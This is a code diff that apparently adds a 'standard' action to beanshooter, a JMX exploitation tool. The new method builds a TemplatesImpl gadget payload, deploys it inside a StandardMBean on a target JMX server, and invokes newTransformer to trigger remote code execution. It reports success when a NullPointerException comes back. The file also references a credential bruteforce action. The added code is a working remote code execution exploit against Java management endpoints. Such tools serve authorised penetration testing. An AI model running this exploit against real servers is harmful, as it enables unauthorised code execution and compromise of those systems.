@@ -15,11 +15,13 @@ import javax.management.ObjectInstance;
 import javax.management.ObjectName;
 import javax.management.ReflectionException;
 import javax.management.RuntimeMBeanException;
+import javax.management.StandardMBean;
 import javax.management.modelmbean.ModelMBeanAttributeInfo;
 import javax.management.modelmbean.ModelMBeanInfo;
 import javax.management.modelmbean.ModelMBeanInfoSupport;
 import javax.management.modelmbean.ModelMBeanOperationInfo;
 import javax.management.modelmbean.RequiredModelMBean;
+import javax.xml.transform.Templates;
 
 import org.jolokia.client.exception.J4pRemoteException;
 
@@ -382,6 +384,58 @@ public class Dispatcher {
     };
 
     /**
+     * Deploy a StandardMBean that implements TemplatesImpl.
+     */
+    public void standard()
+    {
+        String className = StandardMBean.class.getName();
+        ObjectName mBeanObjectName = Utils.getObjectName("de.qtc.beanshooter:standard=" + System.nanoTime());
+
+        String operation = "template-" + BeanshooterOption.STANDARD_OPERATION.<String>getValue();
+        String arguments = BeanshooterOption.STANDARD_OPERATION_ARGS.getValue();
+
+        if (!operation.equals("template-tonka") && arguments.equals(""))
+        {
+            Logger.eprintlnMixedYellow("The " + operation + " action requires",  "an additional parameter", "to work with.");
+            Utils.exit();
+        }
+
+        Logger.printlnBlue("Creating a TemplateImpl payload object to abuse StandardMBean");
+        Logger.lineBreak();
+        Logger.increaseIndent();
+
+        Object templateGadget = PluginSystem.getPayloadObject(BeanshooterOperation.STANDARD, operation, arguments);
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+
+        String[] ctorArgTypes = new String[] { Object.class.getName(), Class.class.getName() };
+        Object[] ctorArgs = new Object[] { templateGadget, Templates.class };
+
+        mBeanServerClient.deployMBean(className, mBeanObjectName, null, ctorArgs, ctorArgTypes);
+        Logger.lineBreak();
+
+        try
+        {
+            mBeanServerClient.invoke(mBeanObjectName, "newTransformer", new String[0]);
+        }
+        catch (RuntimeMBeanException | MBeanException | ReflectionException | IOException e)
+        {
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if (e instanceof RuntimeMBeanException)
+            {
+                if (t instanceof NullPointerException)
+                {
+                    Logger.printlnMixedBlue("Caught", "NullPointerException", "while invoking the newTransformer action.");
+                    Logger.printlnMixedBlue("This is expected bahavior and the attack most likely", "worked", ":)");
+                }
+            }
+        }
+
+        Logger.lineBreak();
+        mBeanServerClient.unregisterMBean(mBeanObjectName);
+    };
+
+    /**
      * Attempt to bruteforce valid credentials on the targeted JMX endpoint.
      */
     public void brute()
@@ -465,7 +519,7 @@ public class Dispatcher {
                 Logger.printlnBlue("Call was successful.");
         }
 
-        catch (MBeanException | ReflectionException | IOException e)
+        catch (RuntimeMBeanException | MBeanException | ReflectionException | IOException e)
         {
             Throwable t = ExceptionHandler.getCause(e);
             String message = t.getMessage();
